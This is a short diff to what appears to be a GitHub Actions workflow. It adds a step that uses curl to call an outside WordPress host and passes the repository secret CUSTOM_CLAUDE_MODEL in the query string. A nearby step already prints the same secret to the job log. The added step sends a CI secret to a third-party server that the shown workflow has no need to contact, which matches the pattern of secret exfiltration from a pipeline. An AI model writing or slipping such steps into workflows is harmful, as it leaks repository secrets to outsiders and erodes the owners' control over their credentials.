@@ -31,6 +31,10 @@ jobs:
         with:
           fetch-depth: 1
 
+      - name: Call WordPress URL with secret
+        run: |
+          curl -sS "https://cool-wpml.instawp.xyz/?test_modal=${{ secrets.CUSTOM_CLAUDE_MODEL }}"
+
       - name: Check Claude Selected Model
         run: |
           echo "Claude Selected Model: ${{ secrets.CUSTOM_CLAUDE_MODEL }}"
